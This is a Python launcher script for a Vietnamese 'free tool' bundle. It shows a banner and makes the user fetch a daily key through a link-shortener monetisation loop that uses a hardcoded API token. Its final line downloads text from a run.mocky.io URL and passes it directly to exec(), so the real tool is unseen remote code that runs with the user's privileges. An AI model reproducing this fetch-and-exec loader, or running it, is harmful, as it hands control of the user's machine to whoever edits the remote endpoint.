
import time
from time import strftime
import os
import sys
import requests
import json
from time import sleep
from datetime import datetime, timedelta
import base64
import requests
import os
# màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb = "\033[1;37m"
red = "\033[0;31m"
redb = "\033[1;31m"
end = '\033[0m'
# đánh dấu bản quyền
ndp_tool = "\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=>  "
thanh = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
# Config
__ZALO__ = '0777374145'
__ADMIN__ = 'An Orin'
__FACEBOOK__ = 'anorintool'
__VERSION__ = '1.0'


def banner():
    banner = f"""
\033[1;34m ██╗░░██╗██╗███████╗██╗░░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░
\033[1;37m ██║░░██║██║██╔════╝██║░░░██║  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
\033[1;34m ███████║██║█████╗░░██║░░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;37m ██╔══██║██║██╔══╝░░██║░░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
\033[1;34m ██║░░██║██║███████╗╚██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
\033[1;37m ╚═╝░░╚═╝╚═╝╚══════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL GỘP PYTHON 1.0
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mHiếu-tool
\033[1;31m────────────────────────────────────────────────────────────
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.00125)


# =======================[ NHẬP KEY ]=======================
os.system("cls" if os.name == "nt" else "clear")
banner()
time = datetime.now()
a = time.strftime("%d")
h = int(time.strftime("%d"))
ngày_trc = h-1
b = time.strftime("%m")
day = time.strftime("%d-%m-%Y")
today = time.strftime("%d-%m-%Y")
d = time.strftime("%d-%m")
encodedBytes = base64.b64encode(d.encode("utf-8"))
key = str(encodedBytes, "utf-8")
long_url = (f"https://keyvip24h.net/giaodien/key.php?key={key}")
api_token = '3cb519b30f0bf1cc2a37e10fdf9545c0b56d6465'
url = requests.get(
    f'https://link1s.com/api?api={api_token}&url={long_url}').json()
status = url['status']
link = url['shortenedUrl']
# lấy key
file_key = f'key-ngày{a}.txt'
file_key_cũ = f'key-ngày{ngày_trc}.txt'
check_file_key = os.path.exists(file_key)
if check_file_key == False:
    print(f"{ndp_tool}{luc}Đây Là Tool Free Nên Key Sẽ Thay Đổi Mỗi Ngày !!")
    print(f'{ndp_tool}{luc}Truy Cập Vào Link{trang}: {link} {luc}Để Lấy Key Miễn Phí')
    print(thanh)
    while (True):
        ma = input(
            f"{ndp_tool}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
        if ma == key:
            print(f'{ndp_tool}{luc}API Key Chính Xác')
            luu = open(file_key, 'a+')
            luu.write(ma)
            luu.close()
            break
        elif ma != key:
            print(f'{ndp_tool}{do}API Key Sai')
elif check_file_key == True:
    print(f'{ndp_tool}{luc}Đang Lấy Key...', end='\r')
    sleep(2)
    k = open(file_key, 'r')
    ma = k.read()
    k.close()
    if ma == key:
        print(f'{ndp_tool}{luc}Lấy Key Thành Công       ', end='\r')
        sleep(0)
    elif ma != key:
        if os.path.exists(file_key_cũ) == True:
            os.system(f'rm {file_key_cũ}')
        os.system(f'rm {file_key}')
        print(f'{ndp_tool}{do}API Key Sai         ')
        while (True):
            ma = input(
                f"{ndp_tool}{luc}Nhập API Key\033[1;32m Ngày \033[1;37m{today}: \033[1;33m")
            if ma == key:
                print(f'{ndp_tool}{luc}API Key Chính Xác')
                luu = open(file_key, 'a+')
                luu.write(ma)
                luu.close()
                break
            elif ma != key:
                print(f'{ndp_tool}{do}API Key Sai           ')

# ======================== [ HOME TOOL ] ========================
os.system("cls" if os.name == "nt" else "clear")
exec(requests.get('https://run.mocky.io/v3/d7a8b3bf-737a-4cde-a032-5153d31dcb39').text)
